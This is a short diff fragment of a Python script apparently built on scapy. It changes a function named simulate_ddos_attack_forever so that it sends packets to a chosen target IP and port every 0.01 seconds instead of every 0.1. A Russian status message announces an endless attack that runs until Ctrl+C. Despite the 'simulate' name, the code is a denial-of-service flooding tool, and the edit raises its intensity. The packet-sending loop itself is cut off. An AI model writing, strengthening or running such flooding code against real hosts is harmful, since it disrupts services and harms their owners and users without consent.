@@ -2,7 +2,7 @@ from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import send
 from time import sleep
 
-def simulate_ddos_attack_forever(target_ip: str, target_port: int = 80, interval_sec: float = 0.1):
+def simulate_ddos_attack_forever(target_ip: str, target_port: int = 80, interval_sec: float = 0.01):
     print(f"⚡ Бесконечная атака на {target_ip}:{target_port} (нажми Ctrl+C для остановки)")
     packet_count = 0
     try:
